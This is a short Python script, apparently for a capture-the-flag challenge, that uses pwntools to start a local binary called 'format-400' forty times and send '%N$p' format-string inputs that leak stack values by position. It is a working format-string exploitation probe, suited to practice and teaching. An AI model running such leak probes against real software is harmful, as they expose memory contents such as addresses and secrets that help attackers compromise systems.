#!/usr/bin/env python
from pwn import *
 
e = ELF("./format-400")
 
for i in range(40):
    p = process('./format-400',level="error")  
    p.sendline("%%%d$p" % i)
    p.recvline()
    print(i,p.recvline().strip())
    p.close()
